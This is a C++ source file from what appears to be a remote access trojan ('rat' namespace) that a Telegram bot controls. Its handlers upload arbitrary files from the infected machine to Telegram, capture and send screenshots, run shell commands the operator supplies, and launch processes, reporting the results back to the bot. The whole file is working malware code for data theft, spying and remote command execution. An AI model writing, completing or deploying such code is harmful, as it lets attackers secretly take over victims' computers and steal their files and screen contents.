/*rat_handler/src/threaded_handler.cpp*/
#include "rat/Handler.hpp"
#include "rat/networking.hpp"
#include "rat/system.hpp"
#include "rat/media.hpp"
#include <algorithm>
#include <mutex>
#include <thread>
#include <fmt/core.h>
#include <fmt/chrono.h>
#include "logging.hpp"
#include <string>
#include <boost/algorithm/string.hpp>
#include <memory>


namespace rat::handler {
constexpr size_t MAX_TELEGRAM_UPLOAD_SIZE = 50 * 1024 * KB; 

constexpr uint8_t TIMEMOUT_FOR_FILEOPS = 255;
// Command handler implementations
/*This method cannot run asynchronously for big files because the upload will be interrupted from the https requests that are sent from the parent thread */

void Handler::handleGetCommand() {
    if (command.parameters.empty()) {
        this->bot.sendMessage("No file specified");
        return;
    }

    const auto file_path = rat::system::normalizePath(command.parameters[0]);
    if (!std::filesystem::exists(file_path)) {
        this->bot.sendMessage(fmt::format("File does not exist: {}", file_path.string()));
        return;
    }

    const size_t file_size = std::filesystem::file_size(file_path);
    DEBUG_LOG("Uploading {} of size {} bytes", file_path.string(), file_size);

    if (file_size < 2 * 1024 * KB) {
        // small file → sync
        this->bot.sendFile(file_path);
    } else if (file_size < MAX_TELEGRAM_UPLOAD_SIZE) {
        // medium file → async via thread pool
        this->networking_pool.enqueue([this, file_path] {
            try {
                DEBUG_LOG("Async upload {}", file_path.string());
                {
                    std::lock_guard<std::mutex> lock(this->backing_bot_mutex);
                    auto resp = backing_bot.sendFile(file_path);
                    if (resp != rat::tbot::BotResponse::SUCCESS) {
                        ERROR_LOG("Failed to upload {}", file_path.string());
                    }
                }
            } catch (const std::exception& ex) {
                ERROR_LOG("Exception in async upload: {}", ex.what());
                std::lock_guard<std::mutex> lock(this->backing_bot_mutex);
                this->backing_bot.sendMessage(fmt::format("Upload exception: {}", ex.what()));
            }
        });
    } else {
        this->bot.sendMessage(fmt::format(
            "File too big for Telegram (max 50 MB or /get method 2MB), this one is {}",
            file_size
        ));
    }
}

void Handler::handleScreenshotCommand() {
    auto image_path = std::filesystem::path(
        fmt::format("{}.jpg", rat::system::getCurrentDateTime_Underscored())
    );

    this->process_pool.enqueue([this, image_path] {
        std::string output_buffer;
        bool success = rat::media::screenshot::takeScreenshot(image_path, output_buffer);
        
        std::lock_guard<std::mutex> lock(backing_bot_mutex);
        
        if (success && std::filesystem::exists(image_path)) {
            DEBUG_LOG("{} taken", image_path.string());

            if (backing_bot.sendPhoto(image_path) != rat::tbot::BotResponse::SUCCESS) {
                ERROR_LOG("Failed uploading {}", image_path.string());
            }
            rat::system::removeFile(image_path);
        }

        if (!output_buffer.empty()) {
            this->backing_bot.sendMessage(output_buffer);
        }
    });

    this->bot.sendMessage("Screenshot command launched.");
}

void Handler::parseAndHandleShellCommand() {
    std::string message_text = telegram_update.message.text;
    message_text.erase(0, 4); // erase "/sh "
    boost::trim(message_text);
    
    size_t space_char_pos = __findFirstOccurenceOfChar(message_text, ' ');
    std::string timeout_string = message_text.substr(0, space_char_pos);
    message_text.erase(0, space_char_pos);
    boost::trim(message_text);
    
    int timeout = 0;
    try {
        timeout = std::stoi(timeout_string);
    }
    catch (const std::exception&) {
        bot.sendMessage(fmt::format("Invalid timeout value: {}", timeout_string));
        return;
    }

    std::future<std::string> result = rat::system::runShellCommand(message_text, static_cast<unsigned int>(timeout), this->timer_pool);
    this->backing_bot.sendMessage(result.get());
}

void Handler::parseAndHandleProcessCommand() {
    std::string message_text = telegram_update.message.text;
    message_text.erase(0, 9); // remove "/process "
    boost::trim(message_text);

    // Extract timeout
    size_t space_pos = __findFirstOccurenceOfChar(message_text, ' ');
    std::string timeout_str = message_text.substr(0, space_pos);
    message_text.erase(0, space_pos);
    boost::trim(message_text);

    int timeout = 0;
    try {
        timeout = std::stoi(timeout_str);
    } catch (...) {
        this->bot.sendMessage(fmt::format("Invalid timeout value: {}", timeout_str));
        return;
    }
    auto fut = rat::system::runProcessAsync(message_text, timeout, this->timer_pool);
    this->bot.sendMessage(fmt::format("Process '{}' launched successfully.", message_text));

    this->process_pool.enqueue([this, fut = std::move(fut), cmd = message_text]() mutable {
        std::unique_lock<std::mutex> backing_bot_lock(this->backing_bot_mutex);
        try {
            DEBUG_LOG("thread has being created + bot object copied {}", sizeof(tbot::Bot));
            auto res = fut.get(); // wait for process to finish

            std::string feedback;
            if (res.exit_code == -1) {
                feedback = fmt::format("Process '{}' killed (timeout exceeded).", cmd);
            } else if (res.exit_code == -2) {
                feedback = fmt::format("Process '{}' failed with exception:\n{}", cmd, res.stderr_str);
            } else {
                if(res.stderr_str.empty()) {
                    feedback = fmt::format(
                        "Process '{}' exited with code {}\n{}",
                        cmd,
                        res.exit_code,
                        res.stdout_str
                    );
                }else{
                    feedback = fmt::format(
                        "Process '{}' exited with code {}\nSTDERR:\n{}",
                        cmd,
                        res.exit_code,
                        res.stderr_str
                    );

                }
            }
            DEBUG_LOG("[{}:{} {}] {}", __FILE__, __LINE__, __func__, feedback);
            this->backing_bot.sendMessage(feedback);

        } catch (const std::exception& ex) {
            std::string err = fmt::format("Exception waiting for process {}", ex.what());
            ERROR_LOG(err);
            this->backing_bot.sendMessage(err);
        }
    });

}

}//namespace rat::handler
